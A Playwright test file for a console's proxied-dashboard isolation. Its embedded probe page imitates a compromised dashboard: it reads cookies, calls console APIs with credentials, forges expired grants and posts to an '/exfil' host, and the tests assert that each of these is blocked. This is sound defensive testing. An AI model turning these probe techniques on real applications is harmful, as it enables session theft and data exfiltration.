import { createHmac } from 'node:crypto';
import { createServer, type Server } from 'node:http';
import { test, expect, type Page } from '@playwright/test';
import { SignJWT, decodeJwt } from 'jose';
import { WebSocketServer } from 'ws';
import { installFrameGrantRelay } from '../src/lib/frame-grant-relay';
import { resetLoginLimiter } from './ci-login-limiter';

/**
 * A proxied third-party dashboard must not act with console authority. The harness registers one
 * Hermes installation on a fixture node that the console reaches as in production: over SSH, with
 * a pinned host key and its dedicated identity, forwarded to the dashboard listener on the node's
 * loopback (scripts/ci-hermes-ssh-fixture.mjs). That dashboard is served here, and its page script
 * tries everything a compromised dashboard would: read the console session cookie and storage,
 * reach the parent console page, call console APIs with the browser's credentials, send data to
 * another host, mint a new grant, and learn the dashboard's real session token. The isolation
 * (runtime-embed-isolation.mjs) includes the short-lived grants and their renewal, and the
 * WebSocket bridge (server-tls.mjs) that closes an open socket when the console session ends.
 */
const port = Number(process.env['MAGNUS_EMBED_FIXTURE_PORT'] ?? 0);
const ENTRY = '/api/hermes/dashboard';
/** The session token the fixture dashboard injects, as Hermes does; the page must never see it. */
const SESSION_TOKEN = 'fixture-hermes-session-token-0123456789';
const INJECT_TOKEN = `<script>window.__HERMES_SESSION_TOKEN__="${SESSION_TOKEN}";</script>`;
test.skip(!port, 'needs the browser harness (playwright.ci.config.ts)');

const PROBE = `<!doctype html><html><head><meta charset="utf-8"><title>Fixture Hermes dashboard</title>${INJECT_TOKEN}</head><body>
<pre id="probe"></pre>
<script>
(async function () {
  var out = { origin: self.origin, attempts: {} };
  // Split, so the proxy's replacement of the real token cannot touch the comparison itself.
  out.token = window.__HERMES_SESSION_TOKEN__ === ${JSON.stringify(SESSION_TOKEN.slice(0, 10))} + ${JSON.stringify(SESSION_TOKEN.slice(10))} ? 'real' : String(window.__HERMES_SESSION_TOKEN__);
  try { out.cookie = document.cookie; } catch (e) { out.cookie = 'threw ' + e.name; }
  try { localStorage.setItem('k', 'v'); out.storage = localStorage.getItem('k'); } catch (e) { out.storage = 'threw ' + e.name; }
  try { out.parentTitle = window.parent === window ? 'top' : String(window.parent.document.title); } catch (e) { out.parentTitle = 'threw ' + e.name; }
  // Built at run time, as hostile code would, so the proxy's URL rewriting cannot help.
  var api = '/' + 'api/';
  var tries = [
    ['nodes', api + 'proxy/nodes', { credentials: 'include' }],
    ['me', api + 'auth/me', { credentials: 'include' }],
    ['write', api + 'proxy/commands', { method: 'POST', credentials: 'include', headers: { 'content-type': 'application/json' }, body: '{}' }],
    ['writeNoCors', api + 'proxy/commands', { method: 'POST', credentials: 'include', mode: 'no-cors', body: '{}' }],
    ['regrant', api + 'hermes/dashboard', { credentials: 'include' }],
    // A host that would answer any origin: only the frame's connect-src stops it.
    ['exfil', 'http://127.0.0.1:${port}/exfil', {}],
  ];
  for (var i = 0; i < tries.length; i++) {
    try {
      var res = await fetch(tries[i][1], tries[i][2]);
      out.attempts[tries[i][0]] = res.type === 'opaque' ? 'opaque' : res.status + ' ' + (await res.text()).slice(0, 80);
    } catch (e) { out.attempts[tries[i][0]] = 'blocked'; }
  }
  // The dashboard's own API (rewritten onto the frame URL) keeps working with its session token,
  // which the page knows only as a placeholder: the proxy sends the real one upstream.
  try {
    var who = await fetch("/api/whoami", { headers: { authorization: 'Bearer ' + window.__HERMES_SESSION_TOKEN__ } });
    out.own = who.status + ' ' + (await who.text());
  } catch (e) { out.own = 'threw ' + e.message; }
  var pre = document.getElementById('probe');
  pre.textContent = JSON.stringify(out);
  pre.setAttribute('data-done', '1');
})();
</script></body></html>`;

/** Waits for a renewed grant, then calls its own API after the first grant expired. */
const RENEW = `<!doctype html><html><head><meta charset="utf-8"></head><body><pre id="probe"></pre>
<script>
(async function () {
  var out = {};
  out.renewed = await new Promise(function (done) {
    window.addEventListener('magnus:frame-grant', function () { done(true); });
    setTimeout(function () { done(false); }, 10000);
  });
  await new Promise(function (done) { setTimeout(done, 7000); });
  try { var who = await fetch("/api/whoami", { credentials: 'include' }); out.own = who.status + ' ' + (await who.text()); }
  catch (e) { out.own = 'threw ' + e.message; }
  var pre = document.getElementById('probe');
  pre.textContent = JSON.stringify(out);
  pre.setAttribute('data-done', '1');
})();
</script></body></html>`;

/** In its own tab: calls its API five seconds after loading and shows the answer. */
const STANDALONE = `<!doctype html><html><head><meta charset="utf-8"></head><body><pre id="probe"></pre>
<script>
setTimeout(async function () {
  var who = await fetch("/api/whoami", { credentials: 'include' });
  var pre = document.getElementById('probe');
  pre.textContent = who.status + ' ' + (await who.text());
  pre.setAttribute('data-done', '1');
}, 5000);
</script></body></html>`;

/** Opens the dashboard's terminal socket, shows what it receives and how it closes. */
const PTY = `<!doctype html><html><head><meta charset="utf-8">${INJECT_TOKEN}</head><body><pre id="probe"></pre><pre id="closed"></pre>
<script>
var socket = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + "/api/pty?token=" + encodeURIComponent(window.__HERMES_SESSION_TOKEN__));
socket.onmessage = function (event) {
  var pre = document.getElementById('probe');
  pre.textContent = String(event.data);
  pre.setAttribute('data-done', '1');
};
socket.onclose = function (event) { document.getElementById('closed').textContent = String(event.code); };
</script></body></html>`;

let server: Server;
/** Headers of every request and socket the dashboard received, through the SSH tunnel. */
const upstreamCookies: string[] = [];
const upstreamSockets: { token: string | null; cookie: string; closed: boolean }[] = [];
const exfiltrated: string[] = [];

// The harness's session secret (scripts/start-ui-ci.mjs), to forge nearly expired grants.
const GRANT_KEY = createHmac('sha256', 'ci-only-session-secret-0123456789abcdef0123456789').update('magnus-embedded-dashboard-grant/v1').digest();

/** Re-sign a real grant's scope with another expiry, as an old copy of its URL would carry. */
async function regrant(grant: string, exp: number): Promise<string> {
  // Every scope claim (a Hermes grant also names its installation), only the times change.
  const { iss, aud, iat: _iat, exp: _exp, ...scope } = decodeJwt(grant);
  return new SignJWT(scope)
    .setProtectedHeader({ alg: 'HS256' }).setIssuer(String(iss)).setAudience(String(aud))
    .setIssuedAt(exp - 600).setExpirationTime(exp).sign(GRANT_KEY);
}

async function mint(page: Page): Promise<{ grant: string; frameUrl: string }> {
  const response = await page.request.get(`${ENTRY}?mint=json`);
  expect(response.status()).toBe(200);
  return await response.json() as { grant: string; frameUrl: string };
}

// Each test signs in afresh (its own console session, so its own server-side token copy).
test.beforeAll(resetLoginLimiter);
test.afterAll(resetLoginLimiter);

test.beforeAll(async () => {
  server = createServer((req, res) => {
    upstreamCookies.push(String(req.headers.cookie ?? ''));
    const path = (req.url ?? '/').split('?')[0];
    if (path === '/exfil') {
      exfiltrated.push(String(req.headers.origin));
      res.writeHead(200, { 'access-control-allow-origin': '*' });
      res.end('leaked');
    } else if (path === '/standalone') {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      res.end(STANDALONE);
    } else if (path === '/renew') {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      res.end(RENEW);
    } else if (path === '/pty') {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      res.end(PTY);
    } else if (path === '/api/whoami') {
      res.writeHead(200, { 'content-type': 'text/plain' });
      res.end(req.headers.authorization === `Bearer ${SESSION_TOKEN}` ? 'hermes-admin' : 'anonymous');
    } else {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      res.end(PROBE);
    }
  });
  const sockets = new WebSocketServer({ server, path: '/api/pty' });
  sockets.on('connection', (socket, req) => {
    const token = new URL(req.url ?? '/', 'http://127.0.0.1').searchParams.get('token');
    const record = { token, cookie: String(req.headers.cookie ?? ''), closed: false };
    upstreamSockets.push(record);
    socket.on('close', () => { record.closed = true; });
    socket.send(token === SESSION_TOKEN ? 'pty real-token' : `pty ${token}`);
  });
  await new Promise<void>((resolve) => server.listen(port, '127.0.0.1', resolve));
});

test.afterAll(async () => {
  await new Promise((resolve) => server.close(resolve));
});

async function signIn(page: Page): Promise<void> {
  await page.goto('/login');
  await page.getByLabel('Username').fill('ci-admin');
  await page.getByLabel('Password', { exact: true }).fill('ci-only-browser-password');
  await page.getByRole('button', { name: 'Sign In', exact: true }).click();
  await expect(page).toHaveURL('/');
}

/**
 * Every console API response the dashboard document received, by path, read from the browser's
 * network layer (Chromium reports responses that CORS then hides from the page's script).
 */
async function watchConsoleApi(page: Page): Promise<() => Map<string, number[]>> {
  const cdp = await page.context().newCDPSession(page);
  await cdp.send('Network.enable');
  const frameRequests = new Map<string, string>();
  cdp.on('Network.requestWillBeSent', (event) => {
    const path = new URL(event.request.url).pathname;
    if (event.type === 'Document' || !event.documentURL.includes('/_frame/')) return;
    if (/^\/api\/(proxy|auth)\//.test(path) || path === ENTRY) frameRequests.set(event.requestId, path);
  });
  // One outcome per request: the raw response (which also arrives for requests that CORS then
  // hides from the page), the ordinary response event, or 0 when the connection failed (the
  // console refuses a cross-site write before reading its body, so the browser may see a reset).
  // A real status always wins over a failure seen first.
  const outcomes = new Map<string, number>();
  const settle = (requestId: string, status: number) => {
    if (!frameRequests.has(requestId) || (status === 0 && outcomes.has(requestId))) return;
    outcomes.set(requestId, status);
  };
  cdp.on('Network.responseReceivedExtraInfo', (event) => settle(event.requestId, event.statusCode));
  cdp.on('Network.responseReceived', (event) => settle(event.requestId, event.response.status));
  cdp.on('Network.loadingFailed', (event) => settle(event.requestId, 0));
  return () => {
    const seen = new Map<string, number[]>();
    for (const [requestId, status] of outcomes) {
      const path = frameRequests.get(requestId)!;
      seen.set(path, [...(seen.get(path) ?? []), status]);
    }
    return seen;
  };
}

async function expectIsolated(result: Record<string, unknown>, seen: () => Map<string, number[]>): Promise<void> {
  expect(result['origin']).toBe('null');
  expect(String(result['cookie'])).not.toContain('magnus_session');
  // The stand-in storage keeps sandboxed pages working without touching the console's.
  expect(result['storage']).toBe('v');
  const attempts = result['attempts'] as Record<string, string>;
  for (const name of ['nodes', 'me', 'write', 'regrant', 'exfil']) expect(attempts[name], name).toBe('blocked');
  expect(exfiltrated).toEqual([]);
  expect(attempts['writeNoCors']).toBe('opaque');
  // What reached the console was refused before any handler ran (network events can trail the page).
  for (const path of ['/api/proxy/nodes', '/api/auth/me', '/api/proxy/commands', ENTRY]) {
    await expect.poll(() => seen().get(path)?.length ?? 0, { message: `${path} reached the console`, timeout: 5_000 }).toBeGreaterThan(0);
  }
  for (const [path, statuses] of seen()) {
    for (const status of statuses) expect([0, 401, 403], `${path} answered ${status}`).toContain(status);
  }
  expect(result['own']).toBe('200 hermes-admin');
  // The page saw only the placeholder; the real token stayed on the console server.
  expect(result['token']).toBe('magnus-frame');
  // The console session never reached the dashboard.
  expect(upstreamCookies.some((cookie) => cookie.includes('magnus_session'))).toBe(false);
}

test('a proxied dashboard opened in its own tab has no console authority', async ({ page }) => {
  await signIn(page);
  const seen = await watchConsoleApi(page);
  const response = await page.goto(ENTRY);
  expect(new URL(page.url()).pathname).toMatch(/^\/api\/hermes\/dashboard\/_frame\/[\w.-]+\/?$/);
  const policy = response!.headers()['content-security-policy'] ?? '';
  expect(policy).toMatch(/^sandbox /);
  expect(policy).not.toContain('allow-same-origin');
  await expect(page.locator('#probe[data-done]')).toBeAttached({ timeout: 15_000 });
  const result = JSON.parse(await page.locator('#probe').textContent() ?? '{}') as Record<string, unknown>;
  expect(result['parentTitle']).toBe('top');
  await expectIsolated(result, seen);
});

test('a proxied dashboard framed by the console cannot reach the console page or APIs', async ({ page }) => {
  await signIn(page);
  const seen = await watchConsoleApi(page);
  // Frame it exactly as the Hermes Web Gateway page does (HERMES_FRAME_SANDBOX; a unit test keeps them equal).
  await page.evaluate((sandbox) => {
    const frame = document.createElement('iframe');
    frame.id = 'embedded';
    frame.setAttribute('sandbox', sandbox);
    frame.src = '/api/hermes/dashboard';
    document.body.appendChild(frame);
  }, 'allow-scripts allow-forms allow-popups allow-downloads');
  const probe = page.frameLocator('#embedded').locator('#probe[data-done]');
  await expect(probe).toBeAttached({ timeout: 15_000 });
  const result = JSON.parse(await probe.textContent() ?? '{}') as Record<string, unknown>;
  expect(result['parentTitle']).toMatch(/^threw /);
  await expectIsolated(result, seen);
  // The console itself is unaffected.
  expect((await page.request.get('/api/auth/me')).status()).toBe(200);
});

test('the console frame renews a short-lived grant, and an expired one only works with the console cookie', async ({ page, request }) => {
  await signIn(page);
  const { grant, frameUrl } = await mint(page);
  const claims = decodeJwt(grant);
  expect(Number(claims.exp) - Math.floor(Date.now() / 1000)).toBeLessThanOrEqual(600);

  // A grant about to expire, as the frame would hold one ten minutes in.
  const ending = await regrant(grant, Math.floor(Date.now() / 1000) + 6);
  await page.addScriptTag({ content: `window.__installRelay = ${installFrameGrantRelay.toString()};` });
  await page.evaluate(([url, first, sandbox]) => {
    const frame = document.createElement('iframe');
    frame.id = 'embedded';
    frame.setAttribute('sandbox', sandbox!);
    document.body.appendChild(frame);
    (window as unknown as { __installRelay: (f: HTMLIFrameElement, m: string, g: string) => void })
      .__installRelay(frame, '/api/hermes/dashboard?mint=json', first!);
    frame.src = url!;
  }, [`/api/hermes/dashboard/_frame/${ending}/renew`, ending, 'allow-scripts allow-forms allow-popups allow-downloads']);
  const probe = page.frameLocator('#embedded').locator('#probe[data-done]');
  await expect(probe).toBeAttached({ timeout: 25_000 });
  const result = JSON.parse(await probe.textContent() ?? '{}') as Record<string, unknown>;
  expect(result['renewed']).toBe(true);
  // The page's own API still answers after its first grant expired: it now uses the renewed one.
  expect(result['own']).toBe('200 anonymous');

  // The expired grant alone (a URL from a log or the history) reaches nothing.
  // (`request` shares no cookies with the signed-in page.)
  await expect.poll(async () => (await request.get(`/api/hermes/dashboard/_frame/${ending}/api/whoami`)).status(), { timeout: 10_000 }).toBe(401);
  const anonymous = await request.get(`/api/hermes/dashboard/_frame/${ending}`, { headers: { 'sec-fetch-mode': 'navigate' }, maxRedirects: 0 });
  expect(anonymous.status()).toBe(401);

  // A reload with the console cookie re-mints it.
  await page.goto(`/api/hermes/dashboard/_frame/${ending}`);
  const reloaded = new URL(page.url()).pathname;
  expect(reloaded).toMatch(/^\/api\/hermes\/dashboard\/_frame\/[\w.-]+\/?$/);
  expect(reloaded).not.toContain(ending);
  await expect(page.locator('#probe[data-done]')).toBeAttached({ timeout: 15_000 });
  expect(frameUrl).toBe(`/api/hermes/dashboard/_frame/${grant}/`);
});

test('a reload inside the console frame after its grant expired reconnects through the console', async ({ page }) => {
  await signIn(page);
  const { grant } = await mint(page);
  const ending = await regrant(grant, Math.floor(Date.now() / 1000) + 3);
  await page.addScriptTag({ content: `window.__installRelay = ${installFrameGrantRelay.toString()};` });
  await page.evaluate(([url, first, sandbox]) => {
    const frame = document.createElement('iframe');
    frame.id = 'embedded';
    frame.setAttribute('sandbox', sandbox!);
    document.body.appendChild(frame);
    (window as unknown as { __installRelay: (f: HTMLIFrameElement, m: string, g: string) => void })
      .__installRelay(frame, '/api/hermes/dashboard?mint=json', first!);
    frame.src = url!;
  }, [`/api/hermes/dashboard/_frame/${ending}`, ending, 'allow-scripts allow-forms allow-popups allow-downloads']);
  await expect(page.frameLocator('#embedded').locator('#probe[data-done]')).toBeAttached({ timeout: 15_000 });
  // The page renewed its grant at once and moved its address onto it.
  await expect.poll(() => page.frames().find((f) => f.url().includes('/_frame/'))?.url() ?? '', { timeout: 10_000 }).not.toContain(ending);
  await page.waitForTimeout(4_000);
  // As the dashboard does on a 401, reload from inside the sandbox once the first grant expired.
  const embedded = page.frames().find((f) => f.url().includes('/_frame/'))!;
  await embedded.evaluate((first) => { location.href = location.href.replace(/(\/_frame\/)[^/?#]+/, '$1' + first); }, ending);
  await expect(page.frameLocator('#embedded').locator('#probe[data-done]')).toBeAttached({ timeout: 15_000 });
  expect(page.frames().find((f) => f.url().includes('/_frame/'))!.url()).not.toContain(ending);
});

test('a dashboard in its own tab reloads itself onto a re-minted grant when its grant expires', async ({ page }) => {
  await signIn(page);
  const { grant } = await mint(page);
  const ending = await regrant(grant, Math.floor(Date.now() / 1000) + 3);
  await page.goto(`/api/hermes/dashboard/_frame/${ending}/standalone`);
  // Five seconds in, its API call is refused as expired; the page reloads, and the reload, a
  // top-level navigation with the console cookie, is re-minted.
  await expect.poll(() => page.url(), { timeout: 15_000 }).not.toContain(ending);
  expect(new URL(page.url()).pathname).toMatch(/^\/api\/hermes\/dashboard\/_frame\/[\w.-]+\/standalone$/);
  await expect(page.locator('#probe[data-done]')).toHaveText('200 anonymous', { timeout: 15_000 });
});

test('the in-frame reconnect page keeps asking until the console frame answers', async ({ page }) => {
  await signIn(page);
  const { grant } = await mint(page);
  const expired = await regrant(grant, Math.floor(Date.now() / 1000) - 5);
  await page.addScriptTag({ content: `window.__installRelay = ${installFrameGrantRelay.toString()};` });
  // The frame opens normally, then navigates itself (no console cookie) to an expired grant
  // before the console's relay is listening.
  await page.evaluate(([url, sandbox]) => {
    const frame = document.createElement('iframe');
    frame.id = 'embedded';
    frame.setAttribute('sandbox', sandbox!);
    frame.src = url!;
    document.body.appendChild(frame);
  }, [`/api/hermes/dashboard/_frame/${grant}`, 'allow-scripts allow-forms allow-popups allow-downloads']);
  await expect(page.frameLocator('#embedded').locator('#probe[data-done]')).toBeAttached({ timeout: 15_000 });
  const embedded = page.frames().find((f) => f.url().includes('/_frame/'))!;
  await embedded.evaluate((old) => { location.href = location.href.replace(/(\/_frame\/)[^/?#]+/, '$1' + old); }, expired);
  await expect(page.frameLocator('#embedded').locator('#state')).toContainText('Reconnecting', { timeout: 10_000 });
  await page.waitForTimeout(4_000);
  await page.evaluate((first) => {
    (window as unknown as { __installRelay: (f: HTMLIFrameElement, m: string, g: string) => void })
      .__installRelay(document.getElementById('embedded') as HTMLIFrameElement, '/api/hermes/dashboard?mint=json', first);
  }, expired);
  await expect(page.frameLocator('#embedded').locator('#probe[data-done]')).toBeAttached({ timeout: 15_000 });
});

test('the WebSocket bridge carries the dashboard terminal over SSH and closes it when the console signs out', async ({ page }) => {
  test.setTimeout(90_000);
  await signIn(page);
  await page.evaluate((sandbox) => {
    const frame = document.createElement('iframe');
    frame.id = 'embedded';
    frame.setAttribute('sandbox', sandbox);
    frame.src = '/api/hermes/dashboard/pty';
    document.body.appendChild(frame);
  }, 'allow-scripts allow-forms allow-popups allow-downloads');
  const embedded = page.frameLocator('#embedded');
  // The page asked with the placeholder; the bridge sent the real token upstream.
  await expect(embedded.locator('#probe[data-done]')).toHaveText('pty real-token', { timeout: 15_000 });
  const opened = upstreamSockets.at(-1)!;
  expect(opened.cookie).not.toContain('magnus_session');
  expect(await embedded.locator('#closed').textContent()).toBe('');
  // Signing out of the console ends the open terminal within one session check (30 s).
  expect((await page.request.post('/api/auth/logout')).status()).toBe(200);
  await expect(embedded.locator('#closed')).toHaveText('1008', { timeout: 45_000 });
  await expect.poll(() => opened.closed, { timeout: 5_000 }).toBe(true);
});

test('the WebSocket bridge refuses a socket without a valid frame grant', async ({ page }) => {
  await signIn(page);
  const { grant } = await mint(page);
  const outcome = (url: string) => page.evaluate((target) => new Promise<string>((resolve) => {
    const socket = new WebSocket(target);
    socket.onopen = () => { resolve('open'); socket.close(); };
    socket.onclose = (event) => resolve(`closed ${event.code}`);
  }), url);
  const base = new URL(page.url());
  const ws = `ws://${base.host}`;
  const before = upstreamSockets.length;
  // With the console cookie but no grant, with a forged grant, and with an expired one.
  expect(await outcome(`${ws}/api/hermes/dashboard/api/pty`)).toMatch(/^closed /);
  expect(await outcome(`${ws}/api/hermes/dashboard/_frame/forged/api/pty`)).toMatch(/^closed /);
  const expired = await regrant(grant, Math.floor(Date.now() / 1000) - 5);
  expect(await outcome(`${ws}/api/hermes/dashboard/_frame/${expired}/api/pty`)).toMatch(/^closed /);
  expect(upstreamSockets.length).toBe(before);
  // The current grant opens it (from the console page here: the grant is the authority).
  expect(await outcome(`${ws}/api/hermes/dashboard/_frame/${grant}/api/pty`)).toBe('open');
});
